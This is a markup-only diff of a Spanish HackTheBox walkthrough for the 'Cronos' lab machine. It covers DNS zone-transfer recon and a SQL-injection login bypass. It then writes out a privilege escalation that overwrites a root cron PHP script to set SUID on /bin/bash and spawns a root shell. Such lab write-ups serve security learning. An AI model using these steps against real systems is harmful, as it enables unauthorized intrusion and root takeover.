@@ -1,14 +1,14 @@
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/cronos/02-tarjeta.png" />
 </p>
 
 <p>¡Hola!
-En esta ocasión vamos a resolver de la máquina <code class="highlighter-rouge">cronos</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
+En esta ocasión vamos a resolver de la máquina <code class="language-plaintext highlighter-rouge">cronos</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
 La máquina es nivel “Medium”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>
 
 <h2 id="preparación">PREPARACIÓN</h2>
 
-<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="highlighter-rouge">cronos</code> y los subdirectorios <code class="highlighter-rouge">recon</code> junto con <code class="highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
+<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">cronos</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">recon</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkhack cronos
 <span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon
@@ -16,7 +16,7 @@ La máquina es nivel “Medium”, sin embargo, el nivel siempre se lo pones tú
 
 <h2 id="reconocimiento">RECONOCIMIENTO</h2>
 
-<p>Accedemos al directorio <code class="highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
+<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="language-plaintext highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>osping 10.10.10.13
  
@@ -42,7 +42,7 @@ La máquina es nivel “Medium”, sin embargo, el nivel siempre se lo pones tú
 80/tcp open  http
 </code></pre></div></div>
 
-<p>Luego de identificar los puertos abiertos <code class="highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
+<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p22</span>,53,80 <span class="nt">-sCV</span> 10.10.10.13 <span class="nt">-oG</span> versions
 </code></pre></div></div>
@@ -64,7 +64,7 @@ Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 
 <h2 id="reconocimiento-web">RECONOCIMIENTO WEB</h2>
 
-<p>Iniciamos con el reconocimiento del puerto <code class="highlighter-rouge">80</code> por medio de la utilidad <code class="highlighter-rouge">whatweb</code> para identificar software que sea potencialmente vulnerable o de utilidad para nosotros.</p>
+<p>Iniciamos con el reconocimiento del puerto <code class="language-plaintext highlighter-rouge">80</code> por medio de la utilidad <code class="language-plaintext highlighter-rouge">whatweb</code> para identificar software que sea potencialmente vulnerable o de utilidad para nosotros.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb 10.10.10.13
 </code></pre></div></div>
@@ -72,7 +72,7 @@ Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 http://10.10.10.13 <span class="o">[</span>200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.13], Title[Apache2 Ubuntu Default Page: It works]
 </code></pre></div></div>
 
-<p>Realizamos un descubrimiento con <code class="highlighter-rouge">nslookup</code> para identificar <code class="highlighter-rouge">DNS</code> asociados a la dirección IP.</p>
+<p>Realizamos un descubrimiento con <code class="language-plaintext highlighter-rouge">nslookup</code> para identificar <code class="language-plaintext highlighter-rouge">DNS</code> asociados a la dirección IP.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nslookup
 <span class="o">&gt;</span> server 10.10.10.13
@@ -82,18 +82,18 @@ Address: 10.10.10.13#53
 13.10.10.10.in-addr.arpa	name <span class="o">=</span> ns1.cronos.htb.
 </code></pre></div></div>
 
-<p>Podemos evidenciar el <code class="highlighter-rouge">DNS</code> <code class="highlighter-rouge">cronos.htb</code>, por lo que vamos a agregar en el ficheros <code class="highlighter-rouge">/etc/hosts</code> esta información.</p>
+<p>Podemos evidenciar el <code class="language-plaintext highlighter-rouge">DNS</code> <code class="language-plaintext highlighter-rouge">cronos.htb</code>, por lo que vamos a agregar en el ficheros <code class="language-plaintext highlighter-rouge">/etc/hosts</code> esta información.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>vim /etc/hosts
 <span class="c">#AGREGAR</span>
 10.10.10.13     cronos.htb
 </code></pre></div></div>
 
-<p>Ya podemos evidenciar un poco más de información en la pagina web, sin embargo vamos a hacer uso de la utilidad <code class="highlighter-rouge">dig</code>, para identificar subdominios de nuestro objetivo.</p>
+<p>Ya podemos evidenciar un poco más de información en la pagina web, sin embargo vamos a hacer uso de la utilidad <code class="language-plaintext highlighter-rouge">dig</code>, para identificar subdominios de nuestro objetivo.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dig @10.10.10.13 cronos.htb axfr
 </code></pre></div></div>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#RESULTADOS
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#RESULTADOS
 ; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; @10.10.10.13 cronos.htb axfr
 ; (1 server found)
 ;; global options: +cmd
@@ -106,7 +106,7 @@ www.cronos.htb.		604800	IN	A	10.10.10.13
 cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
 </code></pre></div></div>
 
-<p>Vamos a realizar el mismo procedimiento anterior, pero esta vez vamos a agregar el subdominio <code class="highlighter-rouge">admin.cronos.htb</code>.</p>
+<p>Vamos a realizar el mismo procedimiento anterior, pero esta vez vamos a agregar el subdominio <code class="language-plaintext highlighter-rouge">admin.cronos.htb</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>vim /etc/hosts
 <span class="c">#AGREGAR</span>
@@ -115,9 +115,9 @@ cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 
 
 <h2 id="web-exploit--intrusion">WEB EXPLOIT + INTRUSION</h2>
 
-<p>Ahora que tenemos dominios y subdominios, procedemos a investigar un poco y encontramos un portal de acceso en el subdominio <code class="highlighter-rouge">admin.cronos.htb</code> al cual intentamos realizar un ataque <code class="highlighter-rouge">SQLi</code> exitoso.</p>
+<p>Ahora que tenemos dominios y subdominios, procedemos a investigar un poco y encontramos un portal de acceso en el subdominio <code class="language-plaintext highlighter-rouge">admin.cronos.htb</code> al cual intentamos realizar un ataque <code class="language-plaintext highlighter-rouge">SQLi</code> exitoso.</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/cronos/03-page.png" />
 </p>
 
@@ -139,7 +139,7 @@ www-data@cronos:/var/www/admin<span class="nv">$ </span><span class="nb">whoami
 
 <h2 id="escalada-de-privilegios">ESCALADA DE PRIVILEGIOS</h2>
 
-<p>Una vez que tenemos acceso a la máquina, realizamos el escalamiento de privilegios, en este caso, revisando las tareas <code class="highlighter-rouge">cron</code>.</p>
+<p>Una vez que tenemos acceso a la máquina, realizamos el escalamiento de privilegios, en este caso, revisando las tareas <code class="language-plaintext highlighter-rouge">cron</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/crobtab
 </code></pre></div></div>
@@ -155,26 +155,26 @@ www-data@cronos:/var/www/admin<span class="nv">$ </span><span class="nb">whoami
 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>	root	php /var/www/laravel/artisan schedule:run <span class="o">&gt;&gt;</span> /dev/null 2&gt;&amp;1
 </code></pre></div></div>
 
-<p>Como podemos ver en los resultados anteriores, identificamos que <code class="highlighter-rouge">artisan</code> es una tarea que se ejecuta cada minuto con el usuario root, hay que tener en cuenta que tenemos acceso directamente a la ruta donde se ejecuta este script de php, por lo que simplemente vamos a eliminar el archivo <code class="highlighter-rouge">artisan</code> y generar uno nuevo habilitando con la funcion <code class="highlighter-rouge">system</code> el permiso <code class="highlighter-rouge">SUID</code> de <code class="highlighter-rouge">bash</code>, para finalmente aprovecharnos de este permiso configurado y obtener una shell de un usuario administrador.</p>
+<p>Como podemos ver en los resultados anteriores, identificamos que <code class="language-plaintext highlighter-rouge">artisan</code> es una tarea que se ejecuta cada minuto con el usuario root, hay que tener en cuenta que tenemos acceso directamente a la ruta donde se ejecuta este script de php, por lo que simplemente vamos a eliminar el archivo <code class="language-plaintext highlighter-rouge">artisan</code> y generar uno nuevo habilitando con la funcion <code class="language-plaintext highlighter-rouge">system</code> el permiso <code class="language-plaintext highlighter-rouge">SUID</code> de <code class="language-plaintext highlighter-rouge">bash</code>, para finalmente aprovecharnos de este permiso configurado y obtener una shell de un usuario administrador.</p>
 
-<p>Eliminar el archivo <code class="highlighter-rouge">artisan</code></p>
+<p>Eliminar el archivo <code class="language-plaintext highlighter-rouge">artisan</code></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> /var/www/laravel/artisan
 </code></pre></div></div>
 
-<p>Crear el nuevo archivo <code class="highlighter-rouge">artisan</code></p>
+<p>Crear el nuevo archivo <code class="language-plaintext highlighter-rouge">artisan</code></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano /var/www/laravel/artisan
 &lt;?php
         system<span class="o">(</span><span class="s2">"chmod u+s /bin/bash"</span><span class="o">)</span><span class="p">;</span>
 ?&gt;
 </code></pre></div></div>
 
-<p>Monitoreo del permiso <code class="highlighter-rouge">SUID</code> de <code class="highlighter-rouge">/bin/bash</code></p>
+<p>Monitoreo del permiso <code class="language-plaintext highlighter-rouge">SUID</code> de <code class="language-plaintext highlighter-rouge">/bin/bash</code></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@cronos:/dev/shm<span class="nv">$ </span>watch <span class="nt">-n</span> 1 <span class="nb">ls</span> <span class="nt">-la</span> /bin/bash
 <span class="nt">-rwxr-xr-x</span> 1 root root 1037528 Jun 24  2016 /bin/bash -&gt; SIN SUID
 <span class="nt">-rwsr-xr-x</span> 1 root root 1037528 Jun 24  2016 /bin/bash -&gt; CON SUID
 </code></pre></div></div>
 
-<p>Aprovechando el permiso <code class="highlighter-rouge">SUID</code></p>
+<p>Aprovechando el permiso <code class="language-plaintext highlighter-rouge">SUID</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@cronos:/dev/shm<span class="nv">$ </span>bash <span class="nt">-p</span>
 </code></pre></div></div>
@@ -186,7 +186,7 @@ bash-4.3# <span class="nb">whoami
 
 <h2 id="flags">FLAGS</h2>
 
-<p>Una vez tenemos acceso a la máquina, tenemos la posibilidad de leer la flag <code class="highlighter-rouge">user</code> y <code class="highlighter-rouge">root</code></p>
+<p>Una vez tenemos acceso a la máquina, tenemos la posibilidad de leer la flag <code class="language-plaintext highlighter-rouge">user</code> y <code class="language-plaintext highlighter-rouge">root</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#USER</span>
 bash-4.3# find / <span class="nt">-name</span> user.txt 2&gt;/dev/null | xargs <span class="nb">head</span> <span class="nt">-c</span> 10<span class="p">;</span> <span class="nb">echo
@@ -198,9 +198,9 @@ bash-4.3# find / <span class="nt">-name</span> root.txt 2&gt;/dev/null | xargs <
 </span>4491f4cbdd
 </code></pre></div></div>
 
-<p>¡Hemos logrado completar la máquina <code class="highlighter-rouge">cronos</code> de HackTheBox!</p>
+<p>¡Hemos logrado completar la máquina <code class="language-plaintext highlighter-rouge">cronos</code> de HackTheBox!</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/cronos/04-finish.png" />
 </p>
 
